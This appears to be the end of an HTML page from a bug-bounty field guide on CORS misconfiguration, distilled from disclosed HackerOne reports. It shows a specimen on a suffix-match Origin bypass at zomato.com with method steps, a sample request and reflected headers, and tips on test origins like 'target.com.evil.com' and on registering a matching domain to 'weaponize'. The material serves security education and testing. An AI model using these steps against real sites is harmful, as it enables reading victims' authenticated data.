+<p class="insight"><b>Insight —</b> clientaccesspolicy.xml (Silverlight) and crossdomain.xml (Flash) are cheap recon wins: a wildcard domain grant is equivalent to Access-Control-Allow-Origin:* with credentials. Always pull both files early. Scope the policy to specific trusted origins to fix.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/7571" target="_blank" rel="noopener">hackerone.com/reports/7571</a></span><a class="src" href="#report-7571" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-168574" style="--sv:var(--sev-none)" data-sev="0" data-votes="31" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CORS origin suffix-match bypass</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#168574</b> · eternal · none · 31 votes · resolved</div>
+<div class="taxo"><span>Program <b>eternal</b></span><span>Surface <b>web</b></span><span>Chain <b>Reflected credentialed CORS -&gt; read arbitrary authenticat</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The CORS origin allowlist is validated by checking the Origin ends with 'zomato.com' rather than '.zomato.com', so an attacker-registered domain like notzomato.com is reflected as an allowed origin with credentials.</p>
+<h4>Method</h4><ol><li>Send a request with Origin: https://notzomato.com</li><li>Observe Access-Control-Allow-Origin reflects it with Allow-Credentials: true</li><li>Host a page on the attacker domain to read authenticated cross-origin responses</li></ol>
+<div class="pre">Origin: https://notzomato.com
+# server reflects: Access-Control-Allow-Origin: https://notzomato.com
+#                  Access-Control-Allow-Credentials: true</div>
+<p class="insight"><b>Insight —</b> Test CORS with sibling/suffix origins: prefix (target.com.evil.com), suffix (nottarget.com), substring, and null. Endswith/regex without an anchored dot is the classic bug; register the matching domain to weaponize.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/168574" target="_blank" rel="noopener">hackerone.com/reports/168574</a></span><a class="src" href="#report-168574" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Lab</a></div></article></div>
+    
+    <h2 class="sec" id="refs"><span class="tick">§</span>References &amp; practice</h2>
+<ol class="refs">
+<li>PortSwigger Web Security Academy — <a href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">CORS labs</a> (hands-on practice).</li>
+<li>All 22 disclosed reports for this class are catalogued as specimens above.</li>
+<li>See also: <a href="../chains.html">exploit chains</a> · <a href="../payloads.html">payload libraries</a> · <a href="../methodology/recon.html">methodology</a>.</li>
+</ol>
+  </main>
+  <nav class="toc" aria-label="In this entry"><h5>In this entry</h5><a href="#basic-information">Basic information</a><a href="#methodology">Methodology</a><a href="#origin-trust-bypass-variants">Origin-trust bypass variants</a><a href="#reflected-origin-credentials" style="padding-left:24px">↳ Reflected Origin + credentials</a><a href="#null-origin" style="padding-left:24px">↳ null origin</a><a href="#sloppy-allowlist-matching-suffix-substring-regex" style="padding-left:24px">↳ Sloppy allowlist matching (suffix / substring / regex)</a><a href="#any-subdomain-reflection" style="padding-left:24px">↳ Any-subdomain reflection</a><a href="#http-scheme-downgrade-mitm" style="padding-left:24px">↳ http:// scheme downgrade (MITM)</a><a href="#exploitation">Exploitation</a><a href="#legacy-cross-origin-trust-files">Legacy cross-origin trust files</a><a href="#bypasses">Bypasses</a><a href="#escalation-impact">Escalation &amp; impact</a><a href="#prevention">Prevention</a><a href="#tools">Tools</a><a href="#specimens">Specimens (22)</a><a href="#refs">References</a><h5 style="margin-top:22px">Practice</h5><a href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ PortSwigger: CORS</a></nav>
+</div>
+<footer class="foot"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide — distilled from disclosed HackerOne reports for defensive, educational research. Every specimen cites <code>hackerone.com/reports/&lt;id&gt;</code>.</span></footer>
+<script src="../assets/app.js"></script></body></html>
